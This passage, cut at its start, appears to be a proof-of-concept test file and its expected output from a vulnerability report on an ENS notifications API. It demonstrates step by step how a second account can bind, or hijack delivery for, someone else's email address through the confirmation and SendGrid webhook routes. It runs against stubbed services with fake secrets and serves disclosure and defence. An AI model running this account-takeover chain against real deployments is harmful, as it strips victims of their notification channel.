    const host = new URL(url).hostname
    attemptedHosts.push(host)
    if (host === 'api.sendgrid.com') {
      captureMail(url, init)
      return new Response(null, { status: 202 })
    }
    if (host === '127.0.0.1') throw new Error('ECONNREFUSED 127.0.0.1:1')
    realFetchCalls += 1
    throw new Error(`POC GUARD: refused outbound request to ${url}`)
  }) as typeof fetch
})
afterAll(async () => {
  globalThis.fetch = realFetch
  await pool.end()
})

// ---------------------------------------------------------------------------
// environment
// ---------------------------------------------------------------------------
const queued: unknown[] = []
const queue = { send: async (j: unknown) => { queued.push(j) } }
const kv = new Map<string, string>()

let webhookKeyPair: CryptoKeyPair
let webhookSpki = ''

const baseEnv = {
  JWT_SECRET: 'poc-not-a-real-secret',
  DATABASE_URL: CONN,
  CHAIN: 'sepolia',
  SEPOLIA_RPC_URL: 'http://127.0.0.1:1/',
  MANAGER_APP_URL: 'https://app.ens.dev',
  EMAIL_FROM_ADDRESS: 'noreply@example.invalid',
  SENDGRID_API_KEY: 'SG.poc-poc-not-a-real-key',
  EMAIL_QUEUE: queue,
  PUSH_QUEUE: queue,
  TELEGRAM_QUEUE: queue,
  KV: {
    async get(k: string) { return kv.get(k) ?? null },
    async put(k: string, v: string) { kv.set(k, v) },
    async delete(k: string) { kv.delete(k) },
  },
}
const env = () =>
  ({ ...baseEnv, SENDGRID_WEBHOOK_VERIFICATION_KEY: webhookSpki }) as unknown as CloudflareBindings

const ctx = { waitUntil: () => {}, passThroughOnException: () => {} } as unknown as ExecutionContext

/** Every request this file sends through the shipped app, with the session it carried. */
const requestLog: { method: string; path: string; bearer: string }[] = []

const call = (path: string, init?: RequestInit) => {
  const headers = (init?.headers ?? {}) as Record<string, string>
  requestLog.push({
    method: init?.method ?? 'GET',
    path,
    bearer: (headers.Authorization ?? '').replace(/^Bearer /, ''),
  })
  return app.fetch(new Request(`https://api.test${path}`, init), env(), ctx)
}

const json = (token?: string) => ({
  'Content-Type': 'application/json',
  ...(token ? { Authorization: `Bearer ${token}` } : {}),
})

const pass = (name: string, ok: boolean, detail = '') => {
  console.log(`${ok ? 'PASS' : 'FAIL'} ${name}${detail ? ` :: ${detail}` : ''}`)
  expect(ok, name).toBe(true)
}

const resetDb = () =>
  pool.query(
    'TRUNCATE notification_deliveries, notifications, broadcasts_seen, broadcasts, channel_verifications, user_notification_settings, user_channels, transactions, favorites, users RESTART IDENTITY CASCADE',
  )

// ---------------------------------------------------------------------------
// shipped-route helpers
// ---------------------------------------------------------------------------

/** Signs in through POST /auth/nonce + POST /auth/login with a wallet made here. */
async function signIn() {
  const account = privateKeyToAccount(generatePrivateKey())
  const nonceRes = await call('/auth/nonce', { method: 'POST' })
  const { nonce } = (await nonceRes.json()) as { nonce: string }
  const message = createSiweMessage({
    domain: 'app.ens.dev',
    uri: 'https://app.ens.dev',
    address: account.address,
    chainId: 11155111,
    nonce,
    version: '1',
  })
  const signature = await account.signMessage({ message })
  const loginRes = await call('/auth/login', {
    method: 'POST',
    headers: json(),
    body: JSON.stringify({ address: account.address, message, signature, nonce }),
  })
  const body = (await loginRes.json()) as { token?: string }
  const id = (
    await pool.query<{ id: string }>('SELECT id FROM users WHERE address = $1', [
      account.address.toLowerCase(),
    ])
  ).rows[0]
  return {
    address: account.address,
    nonceStatus: nonceRes.status,
    loginStatus: loginRes.status,
    token: body.token ?? '',
    id: id?.id ?? '',
  }
}

const addEmail = (token: string, email: string) =>
  call('/notifications/channels/email', {
    method: 'POST',
    headers: json(token),
    body: JSON.stringify({ email }),
  })

const verifyEmail = (token: string) =>
  call('/notifications/channels/email/verify', {
    method: 'POST',
    headers: json(),
    body: JSON.stringify({ token }),
  })

const listChannels = (token: string) =>
  call('/notifications/channels', { headers: json(token) })

const deleteChannel = (token: string, channelId: string) =>
  call(`/notifications/channels/${channelId}`, { method: 'DELETE', headers: json(token) })

const enableExpiryNotifications = (token: string) =>
  call('/notifications/preferences', {
    method: 'PATCH',
    headers: json(token),
    body: JSON.stringify({ ownedNameExpiry: true }),
  })

/** The verification tokens the application mailed, read from the DB the way the recipient's click would present them. */
const mailedTokens = async (target: string) =>
  (
    await pool.query<{ token: string; user_id: string }>(
      'SELECT v.token, v.user_id FROM channel_verifications v JOIN user_channels c ON c.id = v.channel_id WHERE c.target = $1 ORDER BY v.created_at',
      [target],
    )
  ).rows

/** The ENS confirmation link, exactly as it stands in the message body. */
const VERIFICATION_LINK =
  /https:\/\/[^\s"'<>]+\/notifications\/channels\/email\/verify\?token=([0-9a-f]{32})/

/** The confirmation mails the application actually posted to SendGrid for one mailbox. */
const confirmationMailsTo = (address: string) =>
  sentMail.filter((m) => m.to === address && VERIFICATION_LINK.test(m.text))

/** The token a recipient would click, parsed out of the mail body and nothing else. */
const tokenFromMail = (mail: SentMail | undefined) =>
  mail?.text.match(VERIFICATION_LINK)?.[1] ?? ''

const linkFromMail = (mail: SentMail | undefined) =>
  mail?.text.match(VERIFICATION_LINK)?.[0] ?? ''

const channelRows = async () =>
  (
    await pool.query<{ id: string; user_id: string; target: string; status: string }>(
      'SELECT id, user_id, target, status FROM user_channels ORDER BY id',
    )
  ).rows

const b64 = (b: ArrayBuffer) => Buffer.from(new Uint8Array(b)).toString('base64')

/** A genuine SendGrid event webhook call, signed the way SendGrid signs it. */
async function postSignedEvent(events: unknown, opts: { sign: boolean } = { sign: true }) {
  const body = JSON.stringify(events)
  const ts = String(Math.floor(Date.now() / 1000))
  const headers: Record<string, string> = { 'Content-Type': 'application/json' }
  if (opts.sign) {
    const sig = b64(
      await crypto.subtle.sign(
        { name: 'ECDSA', hash: 'SHA-256' },
        webhookKeyPair.privateKey,
        new TextEncoder().encode(ts + body),
      ),
    )
    headers['X-Twilio-Email-Event-Webhook-Signature'] = sig
    headers['X-Twilio-Email-Event-Webhook-Timestamp'] = ts
  }
  return call('/webhook/sendgrid/events', { method: 'POST', headers, body })
}

const spamreport = (email: string) => [
  { email, event: 'spamreport', timestamp: Math.floor(Date.now() / 1000) },
]
const unsubscribe = (email: string) => [
  { email, event: 'unsubscribe', timestamp: Math.floor(Date.now() / 1000) },
]

/**
 * A fresh address per scenario. The verification-mail quota is keyed on the address
 * alone (3 per hour, src/services/notifications/email-verification-rate-limit.ts), so
 * reusing one address across scenarios would spend it; nothing else here depends on the
 * address, and every scenario is independent.
 */
let addressCounter = 0
const nextAddress = () => `owner-${++addressCounter}@example.com`

/**
 * Drives the whole sequence through the shipped routes and returns the two users.
 * `verifyOrder` decides which of the two identical confirmation links is clicked first.
 */
async function twoVerifiedRowsOnOneAddress(verifyOrder: 'victim-first' | 'attacker-first') {
  await resetDb()
  const address = nextAddress()
  const victim = await signIn()
  const attacker = await signIn()
  await addEmail(attacker.token, address)
  await addEmail(victim.token, address)
  const tokens = await mailedTokens(address)
  const victimToken = tokens.find((t) => t.user_id === victim.id)?.token ?? ''
  const attackerToken = tokens.find((t) => t.user_id === attacker.id)?.token ?? ''
  if (verifyOrder === 'victim-first') {
    await verifyEmail(victimToken)
    await verifyEmail(attackerToken)
  } else {
    await verifyEmail(attackerToken)
    await verifyEmail(victimToken)
  }
  return { victim, attacker, address }
}

const whoWasHit = (
  rows: { user_id: string; status: string }[],
  victimId: string,
  status: string,
) =>
  rows
    .filter((r) => r.status === status)
    .map((r) => (r.user_id === victimId ? 'VICTIM' : 'attacker'))
    .join('+') || 'none'

// ---------------------------------------------------------------------------

describe('user_channels ownership', () => {
  beforeAll(async () => {
    webhookKeyPair = (await crypto.subtle.generateKey(
      { name: 'ECDSA', namedCurve: 'P-256' },
      true,
      ['sign', 'verify'],
    )) as CryptoKeyPair
    webhookSpki = b64(await crypto.subtle.exportKey('spki', webhookKeyPair.publicKey))
  })

  it('prints one PASS line per load-bearing claim', async () => {
    // -----------------------------------------------------------------------
    // 1. What the attacker needs: a wallet, and nothing else.
    // -----------------------------------------------------------------------
    await resetDb()
    const attacker0 = await signIn()
    pass(
      'the attacker session is issued by the shipped SIWE routes to a wallet generated in this file',
      attacker0.nonceStatus === 200 && attacker0.loginStatus === 200 && attacker0.token !== '',
      'POST /auth/nonce -> 200, POST /auth/login -> 200',
    )

    // -----------------------------------------------------------------------
    // 2. NEGATIVE CONTROL — the cross-user guard, doing its job.
    //    Victim verifies first; the attacker's POST is refused and no row is created.
    // -----------------------------------------------------------------------
    await resetDb()
    {
      const addrControl = nextAddress()
      const victim = await signIn()
      const attacker = await signIn()
      expect((await addEmail(victim.token, addrControl)).status).toBe(200)
      const t = (await mailedTokens(addrControl))[0]
      expect((await verifyEmail(t?.token ?? '')).status).toBe(200)

      const refused = await addEmail(attacker.token, addrControl)
      const body = (await refused.json()) as { error?: string }
      const rows = await channelRows()
      pass(
        'negative control: against a verified row the cross-user guard refuses the attacker and writes nothing',
        refused.status === 400 &&
          body.error === 'This email address is already linked to another account' &&
          rows.length === 1,
        `POST /notifications/channels/email -> 400 "${body.error}", user_channels rows = ${rows.length}`,
      )
      // Same request, address nobody holds: the endpoint answers 200 and creates the row.
      const free = await addEmail(attacker.token, 'nobody-holds-this@example.com')
      pass(
        'the same endpoint answers 200 for an address no other account has verified, so the 400 above is a statement about that address',
        free.status === 200,
        'POST /notifications/channels/email for an unheld address -> 200',
      )
    }

    // -----------------------------------------------------------------------
    // 3. The order that works, link by link.
    // -----------------------------------------------------------------------
    await resetDb()
    const addrMain = nextAddress()
    const victim = await signIn()
    const attacker = await signIn()

    const plant = await addEmail(attacker.token, addrMain)
    const afterPlant = await channelRows()
    pass(
      'an account with no relationship to the address may claim it: the row is created pending and ENS mails the confirmation link to the address',
      plant.status === 200 &&
        afterPlant.length === 1 &&
        afterPlant[0]?.status === 'pending' &&
        afterPlant[0]?.user_id === attacker.id,
      'POST /notifications/channels/email -> 200, status = pending',
    )

    const victimAdd = await addEmail(victim.token, addrMain)
    pass(
      'the cross-user guard filters on status = verified, so it does not see the pending row and the real owner is allowed in',
      victimAdd.status === 200 && (await channelRows()).length === 2,
      'POST /notifications/channels/email as the address owner -> 200, user_channels rows = 2',
    )

    const tokens = await mailedTokens(addrMain)
    const victimLink = tokens.find((t) => t.user_id === victim.id)?.token ?? ''
    const attackerLink = tokens.find((t) => t.user_id === attacker.id)?.token ?? ''
    const mainMails = confirmationMailsTo(addrMain)
    const mainSubjects = [...new Set(mainMails.map((m) => m.subject))]
    const mainBodies = [
      ...new Set(mainMails.map((m) => m.text.replace(VERIFICATION_LINK, '<link>'))),
    ]
    pass(
      'both confirmation mails were posted to that one mailbox and are indistinguishable to its owner: same subject, same body once the token is masked',
      mainMails.length === 2 &&
        mainMails.every((m) => m.to === addrMain) &&
        mainSubjects.length === 1 &&
        mainBodies.length === 1 &&
        tokens.length === 2 &&
        victimLink !== '' &&
        attackerLink !== '',
      `two POSTs to https://api.sendgrid.com/v3/mail/send, both to ${addrMain}, subject "${mainSubjects[0]}", bodies identical with the token masked`,
    )

    const firstVerify = await verifyEmail(victimLink)
    const secondVerify = await verifyEmail(attackerLink)
    const both = await channelRows()
    const verified = both.filter((r) => r.status === 'verified')
    const owners = new Set(verified.map((r) => r.user_id))
    pass(
      'POST /notifications/channels/email/verify never re-checks the claim, so the second confirmation is accepted after the address is already verified elsewhere',
      firstVerify.status === 200 && secondVerify.status === 200,
      'first verify -> 200, second verify -> 200',
    )
    pass(
      'end state, reached entirely through the shipped routes: one address, two verified user_channels rows, two different owners',
      verified.length === 2 && owners.size === 2 && verified.every((r) => r.target === addrMain),
      `verified rows = ${verified.length}, distinct user_id = ${owners.size}`,
    )

    // -----------------------------------------------------------------------
    // 4. What the address owner can and cannot undo.
    // -----------------------------------------------------------------------
    const attackerRow = both.find((r) => r.user_id === attacker.id)
    const victimRow = both.find((r) => r.user_id === victim.id)
    const crossDelete = await deleteChannel(victim.token, attackerRow?.id ?? '')
    pass(
      'the address owner cannot delete the other row: DELETE /notifications/channels/:id is scoped to the caller',
      crossDelete.status === 404,
      `DELETE /notifications/channels/<the other row> as the address owner -> ${crossDelete.status}`,
    )
    const listed = (await (await listChannels(victim.token)).json()) as unknown[]
    pass(
      'the address owner is never shown the other row, so nothing in the product reports the state',
      Array.isArray(listed) && listed.length === 1,
      `GET /notifications/channels as the address owner returns ${Array.isArray(listed) ? listed.length : 'not a list'} channel`,
    )
    expect((await deleteChannel(victim.token, victimRow?.id ?? '')).status).toBe(200)
    const reAdd = await addEmail(victim.token, addrMain)
    const reAddBody = (await reAdd.json()) as { error?: string }
    pass(
      'having removed their own row the address owner can no longer link their own address, because the row that survives is verified',
      reAdd.status === 400 &&
        reAddBody.error === 'This email address is already linked to another account',
      `POST /notifications/channels/email -> 400 "${reAddBody.error}"`,
    )

    // -----------------------------------------------------------------------
    // 4b. The one-click state on its own: the other account holds the only row.
    //     What the address owner can do about that, measured rather than assumed.
    // -----------------------------------------------------------------------
    await resetDb()
    {
      const addrOneClick = nextAddress()
      const owner = await signIn()
      const stranger = await signIn()

      // Everything from here to the binding is the exploit. Nothing before it counts,
      // because both sessions are already held before the chain starts.
      const chainStart = requestLog.length
      expect((await addEmail(stranger.token, addrOneClick)).status).toBe(200)

      // What ENS actually handed SendGrid for that claim, read out of the request body.
      const oneClickMails = confirmationMailsTo(addrOneClick)
      const mail = oneClickMails[0]
      const link = linkFromMail(mail)
      const clickToken = tokenFromMail(mail)
      pass(
        "the mail ENS composed for the other account's claim is addressed to the address owner's own mailbox and carries an ENS confirmation link",
        oneClickMails.length === 1 &&
          mail?.to === addrOneClick &&
          mail?.subject === 'Verify your email address - ENS Notifications' &&
          link.startsWith(
            'https://app.ens.dev/notifications/channels/email/verify?token=',
          ) &&
          (mail?.html ?? '').includes(link),
        `POST https://api.sendgrid.com/v3/mail/send, personalizations[0].to[0].email = ${mail?.to}, subject = "${mail?.subject}", link = https://app.ens.dev/notifications/channels/email/verify?token=<32 hex characters>`,
      )

      // One click, driven by the token parsed out of that mail body. The database copy is
      // read first only so the two can be compared afterwards; it is not what is clicked.
      const dbCopy = (await mailedTokens(addrOneClick))[0]?.token ?? ''
      const clicked = await verifyEmail(clickToken)
      pass(
        'the confirmation is driven by the token parsed out of the mail body, not by a value read from the database',
        clickToken.length === 32 &&
          /^[0-9a-f]+$/.test(clickToken) &&
          clicked.status === 200 &&
          clickToken === dbCopy,
        'POST /notifications/channels/email/verify carrying the token from the mailed link -> 200, and that string matches the one channel_verifications held, compared afterwards as a check',
      )

      const chain = requestLog.slice(chainStart)
      const ownerCalls = chain.filter((r) => r.bearer === owner.token)
      const strangerCalls = chain.filter((r) => r.bearer === stranger.token)
      const unauthenticated = chain.filter((r) => r.bearer === '')
      pass(
        'the address owner interacts exactly once: one unauthenticated confirmation request carrying a token that came from the mail, and no request at all made with their session',
        chain.length === 2 &&
          strangerCalls.length === 1 &&
          strangerCalls[0]?.path === '/notifications/channels/email' &&
          unauthenticated.length === 1 &&
          unauthenticated[0]?.path === '/notifications/channels/email/verify' &&
          ownerCalls.length === 0,
        `requests from the claim to the binding = 2: 1 POST /notifications/channels/email on the other account's bearer, 1 unauthenticated POST /notifications/channels/email/verify; victim interactions = 1, requests carrying the address owner's session = 0`,
      )

      const rowsNow = await channelRows()
      const blocked = await addEmail(owner.token, addrOneClick)
      const blockedBody = (await blocked.json()) as { error?: string }
      pass(
        'one click on the confirmation mail is enough: the address is bound to the other account and the address owner is refused',
        rowsNow.length === 1 &&
          rowsNow[0]?.user_id === stranger.id &&
          rowsNow[0]?.status === 'verified' &&
          blocked.status === 400 &&
          blockedBody.error === 'This email address is already linked to another account',
        `user_channels rows = 1 owned by the other account, the address owner's POST -> 400 "${blockedBody.error}"`,
      )

      // The route back, measured because the report must not claim more than it can.
      expect((await postSignedEvent(spamreport(addrOneClick))).status).toBe(200)
      const afterSpam = await channelRows()
      const retry = await addEmail(owner.token, addrOneClick)
      pass(
        'the address owner does have a route back while that row is the only one, and the product never names it: marking the mail as spam disables the other account\'s row, after which the address can be linked again',
        afterSpam[0]?.status === 'bounced' && retry.status === 200,
        `the other account's row -> ${afterSpam[0]?.status}, the address owner's POST -> ${retry.status}`,
      )
    }

    // -----------------------------------------------------------------------
    // 5. The webhook, controls first.
    // -----------------------------------------------------------------------
    await resetDb()
    {
      const addrLone = nextAddress()
      const unsigned = await postSignedEvent(spamreport(addrLone), { sign: false })
      pass(
        'negative control: an unsigned event is rejected, so the 200s below are not a disabled gate',
        unsigned.status === 401,
        `POST /webhook/sendgrid/events with no signature -> ${unsigned.status}`,
      )

      const lone = await signIn()
      await addEmail(lone.token, addrLone)
      await verifyEmail((await mailedTokens(addrLone))[0]?.token ?? '')
      const res = await postSignedEvent(spamreport(addrLone))
      const after = await channelRows()
      pass(
        'control: with one holder, a signed spamreport disables exactly that holder',
        res.status === 200 && after.length === 1 && after[0]?.status === 'bounced',
        `POST /webhook/sendgrid/events -> 200, that row -> ${after[0]?.status}`,
      )
    }

    // -----------------------------------------------------------------------
    // 6. Which of the two rows a signed event disables. The query carries no
    //    ownership predicate and no ORDER BY, so the choice is PostgreSQL's.
    //    Natural order first: the attacker plants the row, the address owner adds
    //    and confirms their own, the attacker confirms last.
    // -----------------------------------------------------------------------
    const natural: string[] = []
    for (let i = 0; i < 3; i++) {
      const trial = await twoVerifiedRowsOnOneAddress('victim-first')
      const res = await postSignedEvent(spamreport(trial.address))
      expect(res.status).toBe(200)
      natural.push(whoWasHit(await channelRows(), trial.victim.id, 'bounced'))
    }
    pass(
      'in the natural order — the attacker confirms last — the row a signed spamreport disables is the address owner\'s, over three trials',
      natural.length === 3 && natural.every((x) => x === 'VICTIM'),
      `disabled row per trial = ${JSON.stringify(natural)}`,
    )

    // The reverse order is printed, not asserted: it came out differently on two
    // separately created databases carrying the same migrations, which is the point —
    // the application never states which row it means.
    const reversed: string[] = []
    for (let i = 0; i < 3; i++) {
      const rev = await twoVerifiedRowsOnOneAddress('attacker-first')
      const res = await postSignedEvent(spamreport(rev.address))
      expect(res.status).toBe(200)
      reversed.push(whoWasHit(await channelRows(), rev.victim.id, 'bounced'))
    }
    console.log(
      `reverse order (the attacker confirms first), not asserted: ${JSON.stringify(reversed)}`,
    )
    pass(
      'in every trial of both orders exactly one of the two rows is disabled and the other keeps sending, and nothing in the query says which',
      [...natural, ...reversed].length === 6 &&
        [...natural, ...reversed].every((x) => x === 'VICTIM' || x === 'attacker'),
      'six trials, one row disabled each time, selected without reference to ownership',
    )

    {
      const unsub = await twoVerifiedRowsOnOneAddress('victim-first')
      const res = await postSignedEvent(unsubscribe(unsub.address))
      const after = await channelRows()
      pass(
        'the unsubscribe footer of the mail the other account caused resolves to the same row: a signed unsubscribe event disables the address owner and leaves the other row verified',
        res.status === 200 &&
          whoWasHit(after, unsub.victim.id, 'unsubscribed') === 'VICTIM' &&
          after.filter((r) => r.status === 'verified').length === 1,
        'POST /webhook/sendgrid/events (unsubscribe) -> 200, the address owner -> unsubscribed, the other row stays verified',
      )
    }

    // -----------------------------------------------------------------------
    // 7. What that costs the address owner, with the paired before/after.
    // -----------------------------------------------------------------------
    {
      const scenario = await twoVerifiedRowsOnOneAddress('victim-first')
      const v = scenario.victim
      expect((await enableExpiryNotifications(v.token)).status).toBe(200)

      const payload = {
        name: 'probe.eth',
        expiryDate: new Date(Date.now() + 86_400_000).toISOString(),
        daysLeft: 1,
        isOwner: true,
      }
      const notify = (key: string) =>
        createNotification({
          env: env(),
          db: realDb,
          userId: v.id,
          kind: 'name-expiry',
          payload: payload as never,
          idempotencyKey: key,
        })

      await notify('poc-before')
      const before = await pool.query<{ n: string }>(
        "SELECT count(*)::text AS n FROM notification_deliveries d JOIN notifications n ON n.id = d.notification_id WHERE n.user_id = $1 AND d.channel = 'email'",
        [v.id],
      )
      pass(
        'control: before the event, the address owner\'s own expiry notification queues one email delivery',
        before.rows[0]?.n === '1',
        `notification_deliveries for the address owner = ${before.rows[0]?.n}`,
      )

      expect((await postSignedEvent(spamreport(scenario.address))).status).toBe(200)
      await notify('poc-after')
      const after = await pool.query<{ n: string }>(
        "SELECT count(*)::text AS n FROM notification_deliveries d JOIN notifications n ON n.id = d.notification_id WHERE n.user_id = $1 AND d.channel = 'email' AND n.idempotency_key = 'poc-after'",
        [v.id],
      )
      const inApp = await pool.query<{ n: string }>(
        "SELECT count(*)::text AS n FROM notifications WHERE user_id = $1 AND idempotency_key = 'poc-after'",
        [v.id],
      )
      pass(
        'after the event, the same notification queues no email delivery for the address owner, while the in-app row is still created',
        after.rows[0]?.n === '0' && inApp.rows[0]?.n === '1',
        `email deliveries = ${after.rows[0]?.n}, in-app notifications rows = ${inApp.rows[0]?.n}`,
      )

      const feed = (await (await call('/notifications', { headers: json(v.token) })).json()) as {
        notifications?: unknown[]
      }
      pass(
        'the address owner is still notified in the product: GET /notifications returns the same events, so what is lost is the external copy',
        Array.isArray(feed.notifications) && feed.notifications.length === 2,
        `GET /notifications as the address owner returns ${feed.notifications?.length} notifications`,
      )

      const survivors = await channelRows()
      pass(
        'the other account keeps a verified channel on the address, so ENS mail addressed to that mailbox continues on its behalf',
        survivors.filter((r) => r.status === 'verified' && r.target === scenario.address).length === 1,
        'verified rows remaining on that address = 1',
      )

      const resend = await call(
        `/notifications/channels/${survivors.find((r) => r.user_id === v.id)?.id}/resend`,
        { method: 'POST', headers: json(v.token) },
      )
      pass(
        'the address owner has no self-service repair: resend refuses anything that is not pending, and re-adding hits the guard measured above',
        resend.status === 400,
        `POST /notifications/channels/:id/resend on the disabled row -> ${resend.status}`,
      )
    }

    // -----------------------------------------------------------------------
    // 8. Network boundary.
    // -----------------------------------------------------------------------
    const distinct = [...new Set(attemptedHosts)].sort()
    pass(
      'network boundary: the real fetch was never reached; the shipped code addressed only api.sendgrid.com, answered in process, and the closed local port',
      realFetchCalls === 0 &&
        distinct.every((h) => h === 'api.sendgrid.com' || h === '127.0.0.1'),
      `hosts addressed = ${JSON.stringify(distinct)}`,
    )
  }, 300_000)
})
```

### Pinned expected output

Save as `workers/api-worker/src/poc/EXPECTED_email-channel-ownership.txt` and compare with `cmp`.

```
PASS the attacker session is issued by the shipped SIWE routes to a wallet generated in this file :: POST /auth/nonce -> 200, POST /auth/login -> 200
PASS negative control: against a verified row the cross-user guard refuses the attacker and writes nothing :: POST /notifications/channels/email -> 400 "This email address is already linked to another account", user_channels rows = 1
PASS the same endpoint answers 200 for an address no other account has verified, so the 400 above is a statement about that address :: POST /notifications/channels/email for an unheld address -> 200
PASS an account with no relationship to the address may claim it: the row is created pending and ENS mails the confirmation link to the address :: POST /notifications/channels/email -> 200, status = pending
PASS the cross-user guard filters on status = verified, so it does not see the pending row and the real owner is allowed in :: POST /notifications/channels/email as the address owner -> 200, user_channels rows = 2
PASS both confirmation mails were posted to that one mailbox and are indistinguishable to its owner: same subject, same body once the token is masked :: two POSTs to https://api.sendgrid.com/v3/mail/send, both to owner-2@example.com, subject "Verify your email address - ENS Notifications", bodies identical with the token masked
PASS POST /notifications/channels/email/verify never re-checks the claim, so the second confirmation is accepted after the address is already verified elsewhere :: first verify -> 200, second verify -> 200
PASS end state, reached entirely through the shipped routes: one address, two verified user_channels rows, two different owners :: verified rows = 2, distinct user_id = 2
PASS the address owner cannot delete the other row: DELETE /notifications/channels/:id is scoped to the caller :: DELETE /notifications/channels/<the other row> as the address owner -> 404
PASS the address owner is never shown the other row, so nothing in the product reports the state :: GET /notifications/channels as the address owner returns 1 channel
PASS having removed their own row the address owner can no longer link their own address, because the row that survives is verified :: POST /notifications/channels/email -> 400 "This email address is already linked to another account"
PASS the mail ENS composed for the other account's claim is addressed to the address owner's own mailbox and carries an ENS confirmation link :: POST https://api.sendgrid.com/v3/mail/send, personalizations[0].to[0].email = owner-3@example.com, subject = "Verify your email address - ENS Notifications", link = https://app.ens.dev/notifications/channels/email/verify?token=<32 hex characters>
PASS the confirmation is driven by the token parsed out of the mail body, not by a value read from the database :: POST /notifications/channels/email/verify carrying the token from the mailed link -> 200, and that string matches the one channel_verifications held, compared afterwards as a check
PASS the address owner interacts exactly once: one unauthenticated confirmation request carrying a token that came from the mail, and no request at all made with their session :: requests from the claim to the binding = 2: 1 POST /notifications/channels/email on the other account's bearer, 1 unauthenticated POST /notifications/channels/email/verify; victim interactions = 1, requests carrying the address owner's session = 0
PASS one click on the confirmation mail is enough: the address is bound to the other account and the address owner is refused :: user_channels rows = 1 owned by the other account, the address owner's POST -> 400 "This email address is already linked to another account"
PASS the address owner does have a route back while that row is the only one, and the product never names it: marking the mail as spam disables the other account's row, after which the address can be linked again :: the other account's row -> bounced, the address owner's POST -> 200
PASS negative control: an unsigned event is rejected, so the 200s below are not a disabled gate :: POST /webhook/sendgrid/events with no signature -> 401
PASS control: with one holder, a signed spamreport disables exactly that holder :: POST /webhook/sendgrid/events -> 200, that row -> bounced
PASS in the natural order — the attacker confirms last — the row a signed spamreport disables is the address owner's, over three trials :: disabled row per trial = ["VICTIM","VICTIM","VICTIM"]
PASS in every trial of both orders exactly one of the two rows is disabled and the other keeps sending, and nothing in the query says which :: six trials, one row disabled each time, selected without reference to ownership
PASS the unsubscribe footer of the mail the other account caused resolves to the same row: a signed unsubscribe event disables the address owner and leaves the other row verified :: POST /webhook/sendgrid/events (unsubscribe) -> 200, the address owner -> unsubscribed, the other row stays verified
PASS control: before the event, the address owner's own expiry notification queues one email delivery :: notification_deliveries for the address owner = 1
PASS after the event, the same notification queues no email delivery for the address owner, while the in-app row is still created :: email deliveries = 0, in-app notifications rows = 1
PASS the address owner is still notified in the product: GET /notifications returns the same events, so what is lost is the external copy :: GET /notifications as the address owner returns 2 notifications
PASS the other account keeps a verified channel on the address, so ENS mail addressed to that mailbox continues on its behalf :: verified rows remaining on that address = 1
PASS the address owner has no self-service repair: resend refuses anything that is not pending, and re-adding hits the guard measured above :: POST /notifications/channels/:id/resend on the disabled row -> 400
PASS network boundary: the real fetch was never reached; the shipped code addressed only api.sendgrid.com, answered in process, and the closed local port :: hosts addressed = ["127.0.0.1","api.sendgrid.com"]
```
